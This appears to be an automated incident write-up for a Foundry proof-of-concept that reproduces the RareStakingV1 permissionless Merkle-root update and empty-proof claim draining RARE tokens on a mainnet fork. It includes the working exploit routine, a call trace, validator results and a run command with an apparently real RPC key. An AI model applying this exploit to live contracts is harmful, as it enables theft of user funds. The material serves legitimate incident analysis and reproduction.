## Overview & Context

This proof-of-concept (PoC) demonstrates the RareStakingV1 permissionless Merkle-root update and RARE drain on an Ethereum mainnet fork. It reproduces the core exploit behavior described in the root-cause analysis for the RareStaking staking proxy at `0x3f4d749675b3e48bccd932033808a7079328eb48` and the SuperRareToken (RARE) ERC20 at `0xba5bde662c17e2adff1075610382b9b691296350`.

The root cause, as established in the incident analysis, is a flawed authorization check in `RareStakingV1.updateMerkleRoot` that allows any unprivileged caller to install an arbitrary Merkle root. Combined with Merkle proof semantics where a single-leaf tree can use an empty proof (`leaf == root`), an attacker can encode a degenerate root that pays the entire staking balance to an attacker-controlled address and then claim that amount in a single transaction.

**How to run the PoC:**

```bash
cd forge_poc
RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" \
  forge test --via-ir -vvvvv --match-test test_Exploit_RareStaking_PermissionlessMerkleRootDrain
```

This command runs the exploit-focused Foundry test on an Ethereum mainnet fork at block `23_016_422`, the pre-incident state immediately before block `23016423` containing the canonical exploit transaction.

## PoC Architecture & Key Contracts

The PoC is implemented as a single Foundry test contract in `test/Exploit.sol`:

- `RareStakingMerkleRootExploitTest` — the main test contract extending `forge-std/Test`, responsible for:
  - Creating and selecting a mainnet fork at the pre-incident block.
  - Labeling core protocol contracts and adversary addresses.
  - Implementing the exploit routine (`reproducerAttack`) and the end-to-end test.
- `IERC20` — minimal interface for querying token balances.
- `IRareStakingV1` — minimal interface exposing the victim staking proxy’s critical methods.

### Key addresses and roles

- `VICTIM_STAKING_PROXY` — RareStakingV1 ERC1967 proxy:
  - `0x3f4D749675B3e48bCCd932033808a7079328Eb48`
- `RARE_TOKEN` — SuperRareToken (RARE) ERC20:
  - `0xba5BDe662c17e2aDFF1075610382B9B691296350`
- `AUTHORIZED_ROOT_UPDATER` — protocol-designated Merkle root updater:
  - `0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc`
- `attacker` — fresh adversary EOA (`makeAddr("attacker_eoa")`).
- `attackerRecipient` — fresh adversary-controlled recipient (`makeAddr("attacker_recipient")`).

The test labels these entities for readability using `vm.label`, so traces and logs clearly show `RareStakingV1Proxy`, `RARE`, `AuthorizedRootUpdater`, `AttackerEOA`, and `AttackerRecipient`.

### Core exploit logic (Solidity snippet)

The heart of the exploit is the `reproducerAttack` function, which encodes a degenerate Merkle root for the entire staking balance and then claims it with an empty proof:

```solidity
function reproducerAttack() internal {
    uint256 claimAmount = rareToken.balanceOf(VICTIM_STAKING_PROXY);
    assertGt(
        claimAmount,
        0,
        "victim staking proxy must hold RARE before exploit"
    );

    bytes32 attackerLeaf = keccak256(
        abi.encodePacked(attackerRecipient, claimAmount)
    );
    bytes32 attackerRoot = attackerLeaf;

    vm.startPrank(attacker);
    rareStaking.updateMerkleRoot(attackerRoot);
    vm.stopPrank();

    assertEq(
        rareStaking.currentClaimRoot(),
        attackerRoot,
        "unauthorized attacker must be able to install arbitrary Merkle root"
    );

    bytes32[] memory emptyProof = new bytes32[](0);
    vm.startPrank(attackerRecipient);
    rareStaking.claim(claimAmount, emptyProof);
    vm.stopPrank();
}
```

*Snippet: Core exploit routine installing a malicious Merkle root and performing a degenerate claim with an empty proof.*

This logic mirrors the mainnet exploit sequence but uses fresh adversary identities rather than the historical router/helper contracts.

## Adversary Execution Flow

The adversary execution as modeled in the PoC can be broken down into four phases: environment setup, pre-checks, exploit execution, and profit realization.

### 1. Environment setup (mainnet fork and roles)

In `setUp`, the test creates and selects a mainnet fork using `RPC_URL` and the pre-incident block:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, MAINNET_FORK_BLOCK);
    vm.selectFork(forkId);

    vm.label(VICTIM_STAKING_PROXY, "RareStakingV1Proxy");
    vm.label(RARE_TOKEN, "RARE");
    vm.label(AUTHORIZED_ROOT_UPDATER, "AuthorizedRootUpdater");

    attacker = makeAddr("attacker_eoa");
    attackerRecipient = makeAddr("attacker_recipient");

    vm.label(attacker, "AttackerEOA");
    vm.label(attackerRecipient, "AttackerRecipient");
}
```

*Snippet: Test setup creating a mainnet fork at block 23,016,422 and labeling protocol and adversary roles.*

This ensures the test runs against the real Ethereum mainnet state at block `23_016_422`, where the staking proxy still holds its full pre-incident RARE balance and the implementation slot points to the RareStakingV1 logic contract documented in the root-cause artifacts.

### 2. Pre-checks and oracle validation setup

The main test function begins by enforcing the `pre_check` conditions from the oracle definition:

- The victim staking proxy must have a strictly positive RARE balance.
- The attacker must be unprivileged (neither the owner nor the protocol’s authorized root updater).

```solidity
uint256 victimRareBefore = rareToken.balanceOf(VICTIM_STAKING_PROXY);
assertGt(
    victimRareBefore,
    0,
    "victim staking proxy must have non-zero RARE balance before exploit"
);

address ownerAddr = rareStaking.owner();
require(
    attacker != ownerAddr &&
        attacker != AUTHORIZED_ROOT_UPDATER,
    "attacker must not be owner or the authorized root-updater"
);
```

This matches the incident assumptions that the exploiter is an unprivileged caller, distinct from the contract owner and the special root-updater.

### 3. Exploit execution (ACT sequence)

The PoC compresses the attack into a clean ACT-style sequence:

1. **Adversary configuration** — `attacker` and `attackerRecipient` are created as fresh addresses with no special privileges.
2. **Permissionless Merkle-root update** — `attacker` calls `updateMerkleRoot` on the staking proxy with a root encoding `(attackerRecipient, claimAmount)`:
   - This demonstrates the broken guard in `updateMerkleRoot`, which is supposed to restrict callers to the owner or `AUTHORIZED_ROOT_UPDATER` but in fact permits arbitrary EOAs.
3. **Degenerate claim with empty proof** — `attackerRecipient` calls `claim(claimAmount, [])`:
   - Because the Merkle root equals `keccak256(abi.encodePacked(attackerRecipient, claimAmount))`, the Merkle proof verification accepts an empty proof (`leaf == root`), treating this single-leaf tree as valid.

The Foundry trace captured in the validator log confirms the on-chain behaviors:

```text
RareStakingMerkleRootExploitTest::test_Exploit_RareStaking_PermissionlessMerkleRootDrain()
  ...
  RareStakingV1::updateMerkleRoot(0x11b6...e63) [delegatecall]
    emit NewClaimRootAdded(root: 0x11b6...e63, round: 3, ...)
    storage changes:
      @ 0: ... → 0x11b6...e63
      @ 2: 2 → 3
  ...
  RareStakingV1::claim(11907874713019104529057960, []) [delegatecall]
    SuperRareToken::transfer(AttackerRecipient, 11907874713019104529057960)
      emit Transfer(from: RareStakingV1Proxy, to: AttackerRecipient, value: 11907874713019104529057960)
    emit TokensClaimed(..., amount: 11907874713019104529057960, round: 3)
```

*Snippet: Extract from the Forge call trace showing the unauthorized Merkle-root update and degenerate claim draining the full RARE balance to `AttackerRecipient`.*

### 4. Profit realization and final assertions

After `reproducerAttack` runs, the test asserts that:

- The attacker’s recipient address has strictly more RARE than before.
- The victim staking proxy’s RARE balance has strictly decreased (to zero on a canonical mainnet fork).

```solidity
uint256 attackerRareBefore = rareToken.balanceOf(attackerRecipient);

reproducerAttack();

uint256 attackerRareAfter = rareToken.balanceOf(attackerRecipient);
uint256 victimRareAfter = rareToken.balanceOf(VICTIM_STAKING_PROXY);

assertGt(
    attackerRareAfter,
    attackerRareBefore,
    "attacker must have strictly more RARE after exploit"
);

assertLt(
    victimRareAfter,
    victimRareBefore,
    "victim staking proxy must lose RARE during exploit"
);
```

These checks align the PoC behavior with the ACT profit predicate from the root-cause analysis: a positive RARE-denominated profit for the adversary cluster and a corresponding decrease in the victim staking proxy’s RARE holdings.

## Oracle Definitions and Checks

The PoC is guided by `artifacts/poc/oracle_generator/oracle_definition.json`, which defines variables, pre-checks, hard constraints, and soft constraints. The test maps each oracle to concrete assertions, labeled in comments for traceability.

### Variables

- `attacker` / `attacker_recipient` — adversary addresses used to execute the exploit and receive profit; in the PoC these are created via `makeAddr` and never derived from real incident EOAs.
- `victim_staking_proxy` — RareStaking proxy address, used to check victim balances and call the vulnerable functions.
- `rare_token` — SuperRareToken (RARE) contract, used to query balances and enforce that the profit asset is RARE.
- `authorized_root_updater` — protocol-designated root-updater address used in the flawed authorization logic.

### Pre-checks

1. **Victim has non-zero RARE balance**
   - Oracle description: staking proxy must hold a strictly positive RARE balance before the exploit.
   - PoC implementation:
     - `victimRareBefore = rare_token.balanceOf(victim_staking_proxy);`
     - `assertGt(victimRareBefore, 0, "victim staking proxy must have non-zero RARE balance before exploit");`

2. **Attacker is unprivileged (not owner, not root-updater)**
   - Oracle description: attacker must not be the RareStaking owner or the special authorized root-updater.
   - PoC implementation:
     - `address ownerAddr = rareStaking.owner();`
     - `require(attacker != ownerAddr && attacker != AUTHORIZED_ROOT_UPDATER, "attacker must not be owner or the authorized root-updater");`

### Hard constraints

1. **HC_PERMISSIONLESS_MERKLE_ROOT_UPDATE**
   - Oracle: an unprivileged attacker can call `updateMerkleRoot` to set `currentClaimRoot` to an attacker-chosen value.
   - PoC implementation:
     - Constructs `attackerRoot = keccak256(abi.encodePacked(attackerRecipient, claimAmount));`.
     - Calls `rareStaking.updateMerkleRoot(attackerRoot)` from `attacker` via `vm.startPrank(attacker)`.
     - Asserts `currentClaimRoot()` == `attackerRoot`:
       - `"unauthorized attacker must be able to install arbitrary Merkle root"`.

2. **HC_DEGENERATE_MERKLE_CLAIM_SUCCEEDS**
   - Oracle: with `currentClaimRoot` equal to `keccak256(abi.encodePacked(attacker_recipient, claimAmount))`, a claim with the same amount and an empty proof must succeed.
   - PoC implementation:
     - Uses `bytes32[] memory emptyProof = new bytes32[](0);`
     - Calls `rareStaking.claim(claimAmount, emptyProof)` from `attackerRecipient`.
     - The assertion is that the call does not revert and transfers `claimAmount` RARE from the staking proxy to `attackerRecipient`, confirmed by subsequent balance checks and the trace.

3. **HC_PROFIT_ASSET_TYPE_RARE**
   - Oracle: exploit profit must be realized in the RARE token managed by the RareStaking proxy.
   - PoC implementation:
     - `assertEq(address(rareToken), RARE_TOKEN, "exploit profit asset must be the canonical SuperRareToken (RARE)");`

### Soft constraints

1. **SC_ATTACKER_RARE_PROFIT**
   - Oracle: attacker must finish with strictly more RARE than before executing the attack.
   - PoC implementation:
     - `attackerRareBefore = rareToken.balanceOf(attackerRecipient);`
     - After `reproducerAttack`, compares `attackerRareAfter > attackerRareBefore` via `assertGt`.

2. **SC_VICTIM_RARE_DEPLETION**
   - Oracle: victim staking proxy’s RARE balance must strictly decrease during the exploit (expected to go to zero on a canonical mainnet fork).
   - PoC implementation:
     - Records `victimRareBefore` and `victimRareAfter`.
     - Asserts `victimRareAfter < victimRareBefore` via `assertLt`, which is satisfied by a full balance drain in the captured trace.

Overall, the test explicitly enforces every oracle from the definition file, with comments labeling each `HC_*` and `SC_*` section for clarity.

## Validation Result and Robustness

The PoC validator ran the exploit test on a mainnet fork using the prescribed RPC configuration:

- Command:
  - `forge test --via-ir -vvvvv --match-test test_Exploit_RareStaking_PermissionlessMerkleRootDrain`
- Fork:
  - Chain ID: `1` (Ethereum mainnet).
  - Block: `23_016_422` (one block before the canonical exploit block `23016423`).

The validator stored the detailed Forge trace log at:

- `/home/wesley/TxRayExperiment/incident-202601011449/artifacts/poc/poc_validator/forge-test.log`

The structured validation result is recorded in:

```json
{
  "overall_status": "Pass",
  "poc_correctness_checks": {
    "passes_validation_oracles": {
      "passed": "true"
    }
  },
  "poc_quality_checks": {
    "oracle_alignment_with_definition": {
      "passed": "true"
    },
    "human_readable_and_labeled": {
      "passed": "true"
    },
    "no_magic_numbers_and_values_are_derived": {
      "passed": "true"
    },
    "mainnet_fork_no_local_mocks": {
      "passed": "true"
    },
    "self_contained_no_attacker_side_artifacts": {
      "no_attacker_eoa_addresses": { "passed": "true" },
      "no_attacker_deployed_contract_addresses": { "passed": "true" },
      "no_attacker_artifacts_or_calldata": { "passed": "true" }
    },
    "end_to_end_attack_process_described": {
      "passed": "true"
    },
    "alignment_with_root_cause": {
      "passed": "true"
    }
  }
}
```

*Snippet: Summary of the validator’s `poc_validated_result.json` confirming that all correctness and quality criteria are met.*

The PoC is robust in that:

- It derives balances and Merkle claim amounts from the forked chain state rather than hardcoding historical constants.
- It uses fresh adversary addresses and does not depend on attacker-side infrastructure (router or helper contracts).
- It runs on a mainnet fork at the documented pre-state block height, ensuring alignment with the incident’s initial conditions.

## Linking PoC Behavior to Root Cause

The root-cause report identifies two key issues that jointly enable the exploit:

1. **Permissionless Merkle-root update**
   - `updateMerkleRoot` uses a flawed `require` condition:
     - Intended: only the owner or the protocol’s authorized root-updater can change `currentClaimRoot`.
     - Actual: the logic reverts for the intended callers but allows arbitrary EOAs, effectively leaving the Merkle-root update permissionless.
   - In the PoC:
     - `attacker` calls `rareStaking.updateMerkleRoot(attackerRoot)` successfully, despite being neither the owner nor `AUTHORIZED_ROOT_UPDATER`.
     - The test asserts `currentClaimRoot() == attackerRoot`, directly demonstrating the permissionless update behavior.

2. **Degenerate single-leaf Merkle proof**
   - When `currentClaimRoot` equals `keccak256(abi.encodePacked(recipient, amount))` and the proof is empty, `MerkleProof.verify` will accept the claim (leaf equals root).
   - In the PoC:
     - `attackerRoot` is constructed as this single-leaf hash for `(attackerRecipient, claimAmount)`.
     - `attackerRecipient` calls `claim(claimAmount, [])`, and the call succeeds, transferring RARE from the staking proxy to `attackerRecipient`.

These behaviors match the ACT framing in the root-cause artifacts:

- **Adversary-crafted transaction** — represented by the Foundry test’s call sequence, where `attacker` and `attackerRecipient` stand in for the real-world router/helper/EOA cluster.
- **Victim-observed state transition** — RareStakingV1’s `currentClaimRoot` is updated and the staking proxy’s RARE balance is drained to an adversary-controlled address.
- **Success predicate (profit)** — the PoC enforces that `attackerRecipient`’s RARE balance strictly increases and the staking proxy’s RARE balance strictly decreases, reproducing the economic conditions of the incident.

In summary, the PoC provides an end-to-end, mainnet-forked reproduction of the RareStakingV1 Merkle-root vulnerability and drain, aligned with the formal oracle definition and the root-cause analysis. It is self-contained, human-readable, and suitable as a canonical exploit demonstration for this incident.

